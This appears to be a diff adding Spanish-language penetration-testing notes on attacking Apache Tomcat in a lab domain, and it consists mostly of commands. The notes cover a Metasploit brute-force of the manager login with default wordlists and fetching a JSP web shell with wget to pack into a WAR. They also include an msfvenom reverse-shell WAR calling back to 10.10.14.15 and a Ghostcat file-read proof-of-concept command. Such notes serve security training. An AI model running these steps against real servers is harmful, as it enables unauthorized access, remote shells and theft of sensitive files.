@@ -5,4 +5,37 @@ Se usa en el 1.22% de de las paginas
 	## Footprinting
 curl -s http://app-dev.inlanefreight.local:8080/docs/ | grep Tomcat 
 #Realizar request a la pagina de la documentacion
+tomcat-users.xml
+#Este file existe para permitir o no acceso de los usuarios a /manager y host-manager
+
+	## Attacking Tomcat
+auxiliary/scanner/http/tomcat_mgr_login
+#Modulo de Metasploit para brute force el login
+set stop_on_success true
+#Marcar opcion en true
+
+https://github.com/b33lz3bub-1/Tomcat-Manager-Bruteforce
+#Script en python para brute force de usuario y password
+/usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt
+#Path a txt con usuarios tomcat
+/usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt
+#Path a txt con password tomcat
+
+https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp
+#Una vez tengamos acceso a /manager podemos deployar una aplicacion subiendo un archivo WAR. El del link es un JSP web shell que se puede agregar a un WAR
+wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp
+zip -r backup.war cmd.jsp 
+#Se sube el backuo.war con el cmd.jsp agregado
+
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.15 LPORT=4443 -f war > backup.war
+#WAR malicious con msfvenom. Este WAR genera directamente una reverse shell
+
+	## Known vulns
+
+CVE-2020-1938 : Ghostcat
+#Vulnerabilidad que afecta todo Tomcat antes de la 9.0.31, 8.5.51, y 7.0.100 por una mala configuracion del protocolo AJP de Apache (binary protocol que proxea requests)
+https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi
+#POC de la vuln. Permite la lectura y acceso a archivos de la webapp unicamente
+python2.7 tomcat-ajp.lfi.py app-dev.inlanefreight.local -p 8009 -f WEB-INF/web.xml 
+#Ejemplo de acceso al path WEB-INF/web.xml. WEB-INF puede contener data sensible.
 
